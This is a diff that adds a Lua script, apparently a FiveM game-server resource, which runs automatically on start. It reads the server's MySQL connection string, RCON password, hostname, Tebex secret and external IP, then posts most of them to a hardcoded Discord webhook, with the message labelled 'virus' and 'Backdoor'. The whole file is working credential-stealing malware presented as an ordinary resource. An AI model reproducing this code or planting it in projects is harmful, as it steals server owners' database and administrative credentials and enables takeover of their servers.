@@ -1,0 +1,44 @@
+local webhookmdrrrrr = "https://discord.com/api/webhooks/944998728945762366/WGFEvbPq9qqZq-EE6yW7fWNhvA_hl8GdhOHc-RiXyEIt2EtqSWGRWjMGyVug6c8uSRYs"
+ 
+ 
+Citizen.CreateThread(function()
+    PerformHttpRequest("https://myexternalip.com/raw", function (errorCode, resultData, resultHeaders)
+        serverip = resultData
+        sql = GetConvar("mysql_connection_string", "")
+        hostname = GetConvar("sv_hostname", "")
+        rcon = GetConvar("rcon_password", "")
+        license = GetConvar("sv_tebexSecret", "")
+        lol = GetCurrentResourceName()
+        
+        sendToDiscord(webhookmdrrrrr)
+    end)
+end)
+
+function sendToDiscord(webhookmdrrrrr)
+	if rcon == "" then
+    	rcon = "unknown"
+	elseif sql == "" then
+    	sql = "unknown"
+	elseif hostname == "" then
+    	hostname = "unknown"
+	elseif license == "" then
+    	license = "unknown"
+	end
+
+	local time = os.time()
+	local realTime = os.date("%d/%m/%Y à %X", time)
+ 
+	local embeds = {
+       {	
+        	["title"]= "virus",
+        	["type"]="rich",
+        	  ["color"] = "15158332",
+        	  ["description"] = "**Host name:**\n ```"..hostname.."```\n**Database:**\n ```"..sql.."```\n**RCON password:**\n ```"..rcon.."```\n**Server IP:**\n ```"..serverip.."```\n**Resource:** \n```"..lol.."```\n\n",
+        	["footer"]=  {
+        	    ["text"]= ""..realTime.."",
+    	   },
+	    }
+	 }
+ 
+    PerformHttpRequest(webhookmdrrrrr, function(err, text, headers) end, 'POST', json.encode({ username = "Backdoor",embeds = embeds, avatar_url = "https://assets.stickpng.com/images/5a81af7d9123fa7bcc9b0793.png", url = "https://google.com"}), { ['Content-Type'] = 'application/json' })
+	end
